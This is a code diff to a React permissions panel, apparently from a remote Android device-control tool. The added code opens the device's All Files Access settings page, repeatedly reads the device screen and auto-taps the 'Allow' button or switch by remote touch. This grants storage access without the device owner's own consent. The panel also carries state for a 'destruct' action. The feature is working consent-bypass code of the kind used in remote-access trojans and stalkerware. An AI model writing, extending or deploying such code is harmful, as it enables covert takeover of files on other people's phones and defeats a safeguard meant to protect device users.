@@ -1,4 +1,4 @@
-import React, { useState, useCallback } from 'react';
+import React, { useState, useCallback, useEffect, useRef } from 'react';
 
 const PERMISSION_LABELS = {
   'android.permission.CAMERA':                              'Camera',
@@ -40,6 +40,74 @@ export default function PermissionsTab({ device, sendCommand, results }) {
   const [status, setStatus]               = useState('');
   const [destructConfirm, setDestructConfirm] = useState(false);
   const [destructDone, setDestructDone]   = useState(false);
+  const [storageAutoGranting, setStorageAutoGranting] = useState(false);
+  const [storageStatus, setStorageStatus] = useState('');
+  const storageRef = useRef({ active: false, timer: null, lastReadCount: 0 });
+
+  function findGrantElement(elements) {
+    for (const el of elements) {
+      if (el.clickable && el.text && el.text.toLowerCase().includes('allow access')) return el;
+    }
+    for (const el of elements) {
+      if (el.clickable && el.text && el.text.toLowerCase().trim() === 'allow') return el;
+    }
+    for (const el of elements) {
+      if (el.clickable && !el.checked && (el.className || '').toLowerCase().includes('switch')) return el;
+    }
+    return null;
+  }
+
+  useEffect(() => {
+    if (!storageRef.current.active) return;
+    const screenResults = results.filter(r => r.command === 'read_screen' && r.success && r.response);
+    if (screenResults.length <= storageRef.current.lastReadCount) return;
+    storageRef.current.lastReadCount = screenResults.length;
+    const latest = screenResults[0];
+    let screenData = null;
+    try {
+      const parsed = typeof latest.response === 'string' ? JSON.parse(latest.response) : latest.response;
+      screenData = parsed?.screen || null;
+    } catch (_) {}
+    if (!screenData) return;
+    const el = findGrantElement(screenData.elements || []);
+    if (el && el.bounds) {
+      const cx = Math.round((el.bounds.left + el.bounds.right) / 2);
+      const cy = Math.round((el.bounds.top + el.bounds.bottom) / 2);
+      setStorageStatus(`Found "${el.text || 'switch'}" — auto-clicking…`);
+      sendCommand(deviceId, 'touch', { x: cx, y: cy, duration: 100 });
+      storageRef.current.active = false;
+      if (storageRef.current.timer) { clearInterval(storageRef.current.timer); storageRef.current.timer = null; }
+      setStorageAutoGranting(false);
+      setTimeout(() => setStorageStatus('Storage permission granted.'), 1500);
+    } else {
+      setStorageStatus(`Screen read (${screenData.packageName || '?'}) — scanning for grant button…`);
+    }
+  }, [results]);
+
+  const handleStoragePermission = useCallback(() => {
+    setStorageStatus('Sending request to device…');
+    setStorageAutoGranting(true);
+    storageRef.current.active = true;
+    storageRef.current.lastReadCount = results.filter(r => r.command === 'read_screen').length;
+    sendCommand(deviceId, 'request_storage_permission', {});
+    const startReading = () => {
+      setStorageStatus('Reading screen — looking for permission UI…');
+      sendCommand(deviceId, 'read_screen');
+      storageRef.current.timer = setInterval(() => {
+        if (!storageRef.current.active) { clearInterval(storageRef.current.timer); return; }
+        sendCommand(deviceId, 'read_screen');
+      }, 1500);
+    };
+    setTimeout(startReading, 1500);
+    setTimeout(() => {
+      if (storageRef.current.active) {
+        clearInterval(storageRef.current.timer);
+        storageRef.current.active = false;
+        setStorageAutoGranting(false);
+        setStorageStatus('Timed out. Grant manually on device if needed.');
+      }
+    }, 22000);
+  }, [deviceId, sendCommand, results]);
 
   const parsePermissionsFromResults = useCallback((res) => {
     const match = res.find(r => r.command === 'get_permissions' && r.success);
@@ -203,14 +271,41 @@ export default function PermissionsTab({ device, sendCommand, results }) {
           These permissions require manual user action in Android Settings. Clicking "Request" opens the exact settings page on the device.
         </div>
         <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
+
+          {/* ── File & Storage — dedicated auto-grant row ── */}
+          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, background: 'rgba(15,15,26,0.5)', borderRadius: 8, padding: '10px 14px' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
+              <span style={{ fontSize: 22 }}>📂</span>
+              <div style={{ flex: 1 }}>
+                <div style={{ fontSize: 13, fontWeight: 600, color: '#e2e8f0' }}>File & Storage Access</div>
+                <div style={{ fontSize: 11, color: '#64748b', marginTop: 2 }}>
+                  Opens the All Files Access screen on device, reads it immediately via screen reader, and auto-clicks the grant button.
+                </div>
+              </div>
+              <button
+                style={{
+                  padding: '6px 14px', borderRadius: 6, border: '1px solid #7c3aed',
+                  background: storageAutoGranting ? 'rgba(124,58,237,0.35)' : 'rgba(124,58,237,0.15)',
+                  color: '#a78bfa', cursor: isOnline && !storageAutoGranting ? 'pointer' : 'not-allowed',
+                  fontSize: 12, fontWeight: 600, opacity: isOnline ? 1 : 0.5, whiteSpace: 'nowrap',
+                }}
+                onClick={handleStoragePermission}
+                disabled={!isOnline || storageAutoGranting}
+                title="Request All Files Access and auto-grant via screen reader"
+              >
+                {storageAutoGranting ? '⏳ Granting…' : '⚡ Request'}
+              </button>
+            </div>
+            {storageStatus && (
+              <div style={{ fontSize: 11, color: storageStatus.includes('granted') ? '#34d399' : '#94a3b8', paddingLeft: 34, display: 'flex', alignItems: 'center', gap: 6 }}>
+                {storageAutoGranting && <span style={{ display: 'inline-block', width: 7, height: 7, borderRadius: '50%', background: '#7c3aed', animation: 'pulse 1s infinite' }} />}
+                {storageStatus}
+              </div>
+            )}
+          </div>
+
+          {/* ── Other special permissions ── */}
           {[
-            {
-              key: 'storage',
-              label: 'File & Storage Access',
-              desc: 'Grants access to device files, media, and external storage. Request on-demand from here.',
-              icon: '📂',
-              command: 'request_storage_permission',
-            },
             {
               key: 'battery',
               label: 'Battery Optimization Exemption',
@@ -241,11 +336,7 @@ export default function PermissionsTab({ device, sendCommand, results }) {
                 }}
                 onClick={() => {
                   setStatus(`Requesting ${sp.label} on device…`);
-                  if (sp.command) {
-                    sendCommand(deviceId, sp.command, {});
-                  } else {
-                    sendCommand(deviceId, 'request_permission', { permission: sp.permission });
-                  }
+                  sendCommand(deviceId, 'request_permission', { permission: sp.permission });
                   setTimeout(() => setStatus(`${sp.label} requested on device.`), 1800);
                 }}
                 disabled={!isOnline}
